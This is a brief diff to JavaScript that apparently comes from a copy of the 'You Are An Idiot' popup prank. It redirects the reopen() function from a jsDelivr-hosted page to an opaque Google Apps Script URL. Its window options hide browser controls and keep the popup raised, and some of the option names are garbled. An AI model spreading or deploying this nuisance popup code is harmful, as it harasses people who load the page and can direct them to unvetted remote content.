@@ -3,7 +3,7 @@ if (top.location != location) {
 }
 function reopen() {
   window.open(
-    "https://cdn.jsdelivr.net/gh/vihaanb0715-alt/youareanidiot@main/popup.html",
+    "https://script.google.com/macros/s/AKfycbxQOW9dVbihOmyl1JelG3Z2pUNr5pKd7xXlNOYRCEQhzVQr43Nxt8LXAV2sFxfkXcE5/exec",
     "",
     "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
